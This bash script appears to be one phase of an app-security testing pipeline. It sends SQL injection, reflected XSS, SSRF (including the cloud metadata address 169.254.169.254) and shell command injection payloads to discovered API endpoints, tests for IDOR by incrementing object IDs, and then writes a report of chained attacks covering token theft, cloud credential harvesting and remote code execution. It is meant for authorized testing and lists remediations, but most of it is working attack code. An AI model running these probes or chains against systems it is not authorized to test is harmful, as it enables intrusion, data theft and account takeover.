#!/usr/bin/env bash
PIPELINE_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# 18_dastforge.sh - SQL injection + multi-class web vuln testing + vulnerability chaining
#   Tests discovered APIs for SQLi, reflected XSS, SSRF, command injection and IDOR/BOLA,
#   then builds vulnerability chains from co-occurring findings on the same endpoints.
PROFILE_PHASE="18_dastforge"
source "$PIPELINE_ROOT/lib/common.sh"
source "$PIPELINE_ROOT/lib/findings.sh"

PKG="$(tget apk package_name)"
[ -z "$PKG" ] && { err "No package_name"; exit 1; }

cd "$RUN_DIR" || exit 1
CH_DIR="$RUN_DIR/vuln_chaining"
mkdir -p "$CH_DIR/results"

# ---- Proxy (Burp) ----
PROXY=""
PHOST="$(tget proxy host)"
PPORT="$(tget proxy port)"
[ -n "$PHOST" ] && [ -n "$PPORT" ] && PROXY="http://$PHOST:$PPORT"

CURL_BASE=(-s --max-time 15)
[ -n "$PROXY" ] && CURL_BASE+=(-x "$PROXY")

# ============================================================
# A. Discover target endpoints
# ============================================================
info "=== A. Discovering target endpoints ==="
EP="$CH_DIR/target_endpoints.txt"
: > "$EP"
for src in traffic/api_endpoints.txt static/urls.txt code_analysis/cleartext_urls.txt; do
  [ -f "$RUN_DIR/$src" ] && { grep -oE 'https?://[a-zA-Z0-9./_?=&%:-]+' "$RUN_DIR/$src" >> "$EP" || true; info "  endpoints from $src"; }
done
sort -u "$EP" -o "$EP"
EP_COUNT=$(wc -l < "$EP" 2>/dev/null || echo 0)
info "  Total endpoints: $EP_COUNT"
[ "$EP_COUNT" -eq 0 ] && { warn "No endpoints discovered — run 06_traffic_capture first"; exit 0; }

# Verify proxy reachability once
if [ -n "$PROXY" ]; then
  if ! curl "${CURL_BASE[@]}" -o /dev/null -w '%{http_code}' "$(head -1 "$EP")" 2>/dev/null | grep -qE '2|3|4'; then
    warn "Burp proxy $PROXY unreachable — testing directly (no proxy)"
    CURL_BASE=(-s --max-time 15)
  else
    ok "Testing through Burp proxy $PROXY"
  fi
fi

# ============================================================
# Helpers
# ============================================================
send_req() { # method url data -> http_code (last line) ; body in $REQ_BODY
  local method="$1" url="$2" data="$3"
  local args=("${CURL_BASE[@]}" -o "$CH_DIR/results/body.tmp" -w '%{http_code}')
  case "$method" in
    POST)   args+=(-X POST   -H "Content-Type: application/json") ;;
    PUT)    args+=(-X PUT    -H "Content-Type: application/json") ;;
    DELETE) args+=(-X DELETE) ;;
    PATCH)  args+=(-X PATCH  -H "Content-Type: application/json") ;;
  esac
  [ -n "$data" ] && args+=(-d "$data")
  REQ_CODE=$(curl "${args[@]}" "$url" 2>/dev/null)
  REQ_BODY=""
  [ -f "$CH_DIR/results/body.tmp" ] && REQ_BODY=$(cat "$CH_DIR/results/body.tmp")
}

has_param() { # url  -> 1 if has query params
  case "$1" in *'?'*) return 0;; *) return 1;; esac
}

param_pairs() { # url -> prints "name=value" per query param
  local qs="${1#*\?}"
  echo "$qs" | tr '&' '\n'
}

# ============================================================
# B. SQL injection (error / boolean / time-based / UNION)
# ============================================================
info "=== B. SQL injection testing ==="
SQLI_DIR="$CH_DIR/results/sqli"; mkdir -p "$SQLI_DIR"
: > "$CH_DIR/sqli_findings.txt"

SQL_ERRORS='(SQL syntax|mysql|PostgreSQL|ORA-[0-9]{5}|SQLite|sqlite|MSSQL|SqlServer|syntax error|unclosed quotation|ODBC|You have an error)'
SQLI_PAYLOADS=(
  "'"
  "' OR '1'='1"
  "' AND '1'='2"
  "' OR SLEEP(3)-- -"
  "1' OR 1=1-- -"
  "' UNION SELECT NULL,NULL,NULL-- -"
  "1' OR pg_sleep(3)-- -"
  "' WAITFOR DELAY '0:0:3'-- -"
)

sqli_probe() {
  local url="$1" p="$2"
  local base_val="${p#*=}" pname="${p%%=*}"
  [ -z "$base_val" ] && base_val="1"
  local esc=$(printf '%s' "$base_val" | jq -sRr @uri 2>/dev/null || echo "$base_val")
  local clean="${url%%\?*}"
  for payload in "${SQLI_PAYLOADS[@]}"; do
    local enc=$(printf '%s' "$payload" | jq -sRr @uri 2>/dev/null || echo "$payload")
    local test_url="$clean?${pname}=${esc}${enc}"
    send_req GET "$test_url" ""
    if echo "$REQ_BODY" | grep -qiE "$SQL_ERRORS"; then
      echo "ERROR-BASED $url param=$pname payload=$payload" >> "$SQLI_DIR/error_$pname.txt"
      echo "$test_url|ERROR-BASED|$payload" >> "$CH_DIR/sqli_findings.txt"
      return 0
    fi
    # time-based (comparison vs baseline latency)
    local t_start=$(date +%s%N)
    send_req GET "$test_url" ""
    local t_end=$(date +%s%N)
    local dur_ms=$(( (t_end - t_start) / 1000000 ))
    if [ "$dur_ms" -gt 2500 ]; then
      echo "TIME-BASED $url param=$pname payload=$payload (${dur_ms}ms)" >> "$SQLI_DIR/time_$pname.txt"
      echo "$test_url|TIME-BASED|$payload" >> "$CH_DIR/sqli_findings.txt"
      return 0
    fi
  done
  return 1
}

while IFS= read -r ep; do
  has_param "$ep" || continue
  while IFS= read -r p; do
    sqli_probe "$ep" "$p"
  done < <(param_pairs "$ep")
done < "$EP"

SQLI_N=$(wc -l < "$CH_DIR/sqli_findings.txt" 2>/dev/null || echo 0)
if [ "$SQLI_N" -gt 0 ]; then
  warn "  SQLi candidates: $SQLI_N"
  fadd "SQL injection on API parameter" HIGH PROBABLE CWE-89 A03:2021 \
    --cvss 8.1 --component "API" --tags "sqli,api,chaining-primitive" \
    --remediation "Parameterized queries / prepared statements; WAF; input validation" \
    --refs "OWASP A03:2021" "$CH_DIR/sqli_findings.txt"
else
  ok "  No SQLi detected on tested parameters"
fi

# ============================================================
# C. Reflected XSS (reflection check)
# ============================================================
info "=== C. Reflected XSS testing ==="
XSS_DIR="$CH_DIR/results/xss"; mkdir -p "$XSS_DIR"
: > "$CH_DIR/xss_findings.txt"

XSS_PROBE="zzxssz<script>alert(1)</script>"
xss_probe() {
  local url="$1" p="$2" pname="${p%%=*}"
  local clean="${url%%\?*}"
  send_req GET "$clean?${pname}=$(printf '%s' "$XSS_PROBE" | jq -sRr @uri 2>/dev/null || echo "$XSS_PROBE")" ""
  if echo "$REQ_BODY" | grep -q "zzxssz<script>alert(1)</script>"; then
    echo "REFLECTED $url param=$pname" >> "$XSS_DIR/reflected_$pname.txt"
    echo "$url|REFLECTED-XSS|$pname" >> "$CH_DIR/xss_findings.txt"
    return 0
  fi
  return 1
}

while IFS= read -r ep; do
  has_param "$ep" || continue
  while IFS= read -r p; do
    xss_probe "$ep" "$p"
  done < <(param_pairs "$ep")
done < "$EP"

XSS_N=$(wc -l < "$CH_DIR/xss_findings.txt" 2>/dev/null || echo 0)
if [ "$XSS_N" -gt 0 ]; then
  warn "  Reflected XSS candidates: $XSS_N"
  fadd "Reflected XSS on API parameter" MEDIUM PROBABLE CWE-79 A03:2021 \
    --cvss 6.1 --component "API" --tags "xss,chaining-primitive" \
    --remediation "Output-encode responses; Content-Security-Policy; context-aware escaping" \
    --refs "OWASP A03:2021" "$CH_DIR/xss_findings.txt"
else
  ok "  No reflected XSS detected"
fi

# ============================================================
# D. SSRF candidates (url/fetch-style params)
# ============================================================
info "=== D. SSRF testing ==="
SSRF_DIR="$CH_DIR/results/ssrf"; mkdir -p "$SSRF_DIR"
: > "$CH_DIR/ssrf_findings.txt"

SSRF_PARAM='(url|uri|redirect|link|webhook|callback|fetch|src|dest|target|path|next)'
SSRF_PROBES=("http://127.0.0.1" "http://169.254.169.254/latest/meta-data/" "http://localhost")

ssrf_probe() {
  local url="$1" p="$2" pname="${p%%=*}"
  echo "$pname" | grep -qiE "$SSRF_PARAM" || return 1
  local clean="${url%%\?*}"
  for probe in "${SSRF_PROBES[@]}"; do
    local enc=$(printf '%s' "$probe" | jq -sRr @uri 2>/dev/null || echo "$probe")
    send_req GET "$clean?${pname}=${enc}" ""
    if echo "$REQ_BODY" | grep -qiE "169\.254\.169\.254|127\.0\.0\.1|root|security-credentials|ami-id"; then
      echo "SSRF-CANDIDATE $url param=$pname probe=$probe" >> "$SSRF_DIR/$pname.txt"
      echo "$url|SSRF|$pname|$probe" >> "$CH_DIR/ssrf_findings.txt"
      return 0
    fi
  done
  return 1
}

while IFS= read -r ep; do
  has_param "$ep" || continue
  while IFS= read -r p; do
    ssrf_probe "$ep" "$p"
  done < <(param_pairs "$ep")
done < "$EP"

SSRF_N=$(wc -l < "$CH_DIR/ssrf_findings.txt" 2>/dev/null || echo 0)
if [ "$SSRF_N" -gt 0 ]; then
  warn "  SSRF candidates: $SSRF_N"
  fadd "SSRF via URL-style parameter" HIGH SUSPECTED CWE-918 A10:2021 \
    --cvss 8.6 --component "API" --tags "ssrf,chaining-primitive" \
    --remediation "Validate/allowlist destination hosts; block metadata IPs; no raw fetch of user URLs" \
    --refs "OWASP A10:2021" "$CH_DIR/ssrf_findings.txt"
else
  ok "  No SSRF candidates detected"
fi

# ============================================================
# E. Command injection (time-based)
# ============================================================
info "=== E. Command injection testing ==="
CMDI_DIR="$CH_DIR/results/cmdi"; mkdir -p "$CMDI_DIR"
: > "$CH_DIR/cmdi_findings.txt"

CMDI_PAYLOADS=(";sleep 3" "|sleep 3" "\$(sleep 3)" "\`sleep 3\`")

cmdi_probe() {
  local url="$1" p="$2" pname="${p%%=*}" base_val="${p#*=}"
  [ -z "$base_val" ] && base_val="1"
  local esc=$(printf '%s' "$base_val" | jq -sRr @uri 2>/dev/null || echo "$base_val")
  local clean="${url%%\?*}"
  for payload in "${CMDI_PAYLOADS[@]}"; do
    local enc=$(printf '%s' "$payload" | jq -sRr @uri 2>/dev/null || echo "$payload")
    local t0=$(date +%s%N)
    send_req GET "$clean?${pname}=${esc}${enc}" ""
    local t1=$(date +%s%N)
    local dur_ms=$(( (t1 - t0) / 1000000 ))
    if [ "$dur_ms" -gt 2500 ]; then
      echo "CMDI-CANDIDATE $url param=$pname payload=$payload (${dur_ms}ms)" >> "$CMDI_DIR/$pname.txt"
      echo "$url|CMDI|$pname|$payload" >> "$CH_DIR/cmdi_findings.txt"
      return 0
    fi
  done
  return 1
}

while IFS= read -r ep; do
  has_param "$ep" || continue
  while IFS= read -r p; do
    cmdi_probe "$ep" "$p"
  done < <(param_pairs "$ep")
done < "$EP"

CMDI_N=$(wc -l < "$CH_DIR/cmdi_findings.txt" 2>/dev/null || echo 0)
if [ "$CMDI_N" -gt 0 ]; then
  warn "  Command injection candidates: $CMDI_N"
  fadd "Command injection (time-based)" CRITICAL SUSPECTED CWE-78 A03:2021 \
    --cvss 9.8 --component "API" --tags "cmdi,chaining-primitive" \
    --remediation "Never pipe user input to a shell; use allowlisted APIs/exec with arg arrays" \
    --refs "OWASP A03:2021" "$CH_DIR/cmdi_findings.txt"
else
  ok "  No command injection detected"
fi

# ============================================================
# F. IDOR / BOLA (numeric id mutation)
# ============================================================
info "=== F. IDOR / BOLA testing ==="
IDOR_DIR="$CH_DIR/results/idor"; mkdir -p "$IDOR_DIR"
: > "$CH_DIR/idor_findings.txt"

idor_probe() {
  local url="$1"
  local id pname val base next
  id=$(echo "$url" | grep -oE '[?&](id|user_id|order_id|item_id|appointment_id|profile_id)=[0-9]+' | head -1)
  [ -z "$id" ] && return 1
  pname="${id%%=*}"
  pname="${pname#*\?}"
  pname="${pname#*&}"
  val="${id#*=}"
  base="${url%%\?*}"
  next=$((val + 1))
  send_req GET "$url" ""
  local baseline_len=${#REQ_BODY}
  send_req GET "$base?${pname}=$next" ""
  local alt_len=${#REQ_BODY}
  # different, non-trivial body = likely cross-object data access
  if [ "$alt_len" -gt 0 ] && [ $((alt_len - baseline_len)) -gt 20 ]; then
    echo "IDOR-CANDIDATE $url -> $base?${pname}=$next (len $baseline_len->$alt_len)" >> "$IDOR_DIR/$pname.txt"
    echo "$url|IDOR|$pname|$next" >> "$CH_DIR/idor_findings.txt"
    return 0
  fi
  return 1
}

while IFS= read -r ep; do
  idor_probe "$ep"
done < "$EP"

IDOR_N=$(wc -l < "$CH_DIR/idor_findings.txt" 2>/dev/null || echo 0)
if [ "$IDOR_N" -gt 0 ]; then
  warn "  IDOR candidates: $IDOR_N"
  fadd "IDOR/BOLA — object ID enumeration" HIGH SUSPECTED CWE-639 A01:2021 \
    --cvss 7.5 --component "API" --tags "idor,chaining-primitive" \
    --remediation "Server-side object-level authorization per request; avoid sequential IDs; use capabilities" \
    --refs "OWASP A01:2021" "$CH_DIR/idor_findings.txt"
else
  ok "  No IDOR candidates detected"
fi

# ============================================================
# G. Vulnerability chaining
# ============================================================
info "=== G. Building vulnerability chains ==="
CHAINS="$CH_DIR/chains.md"
: > "$CHAINS"
{
  echo "# Vulnerability Chains — $PKG"
  echo ""
  echo "Built from co-occurring findings. A chain escalates a low-severity primitive"
  echo "into a higher-impact exploit — confirm each hop manually before reporting."
  echo ""
  sqli=0; xss=0; ssrf=0; cmdi=0; idor=0
  [ -s "$CH_DIR/sqli_findings.txt" ] && sqli=$(wc -l < "$CH_DIR/sqli_findings.txt")
  [ -s "$CH_DIR/xss_findings.txt" ]  && xss=$(wc -l < "$CH_DIR/xss_findings.txt")
  [ -s "$CH_DIR/ssrf_findings.txt" ] && ssrf=$(wc -l < "$CH_DIR/ssrf_findings.txt")
  [ -s "$CH_DIR/cmdi_findings.txt" ] && cmdi=$(wc -l < "$CH_DIR/cmdi_findings.txt")
  [ -s "$CH_DIR/idor_findings.txt" ] && idor=$(wc -l < "$CH_DIR/idor_findings.txt")

  # 1. SQLi -> auth bypass -> IDOR -> bulk data access
  if [ "$sqli" -gt 0 ] && [ "$idor" -gt 0 ]; then
    echo "## Chain 1: SQLi -> Auth Bypass -> IDOR (bulk data access)"
    echo "- SQLi ($sqli) on an auth/login or user-lookup param can bypass login (boolean-based)."
    echo "- With a valid session, IDOR ($idor) lets you enumerate other users' objects."
    echo "- Impact: mass account/data takeover (CRITICAL)."
    echo ""
  fi

  # 2. Reflected XSS -> session/token theft -> ATO
  if [ "$xss" -gt 0 ]; then
    echo "## Chain 2: Reflected XSS -> Session/Token theft -> ATO"
    echo "- XSS ($xss) executes in the app's context (JWT/session cookies readable via document.cookie)."
    echo "- Exfiltrated token replayed in Burp Repeater -> full account takeover."
    echo ""
  fi

  # 3. SSRF -> cloud metadata -> credentials
  if [ "$ssrf" -gt 0 ]; then
    echo "## Chain 3: SSRF -> Cloud Metadata -> Credentials"
    echo "- SSRF ($ssrf) reaching 169.254.169.254 leaks IAM/instance credentials."
    echo "- Harvested keys grant cloud access -> persistence/lateral movement."
    echo ""
  fi

  # 4. CMDi -> RCE
  if [ "$cmdi" -gt 0 ]; then
    echo "## Chain 4: Command Injection -> RCE"
    echo "- CMDi ($cmdi) is a direct RCE primitive — replace sleep probe with outbound"
    echo "- callback (Burp Collaborator) to confirm and read output."
    echo ""
  fi

  # 5. SSRF -> SQLi on internal service
  if [ "$ssrf" -gt 0 ] && [ "$sqli" -gt 0 ]; then
    echo "## Chain 5: SSRF -> Internal SQLi"
    echo "- SSRF ($ssrf) reaches internal DB/API; SQLi ($sqli) against internal service"
    echo "- bypasses the WAF/external boundary entirely."
    echo ""
  fi

  [ -s "$CHAINS" ] || { echo "No chains formed — findings below threshold."; echo ""; }
} >> "$CHAINS"

info "=== H. Summary ==="
echo "  SQLi: $SQLI_N | XSS: $XSS_N | SSRF: $SSRF_N | CMDi: $CMDI_N | IDOR: $IDOR_N"
ok "Vuln chaining report: $CHAINS"
ok "Findings recorded via fadd (see 08_findings_report)"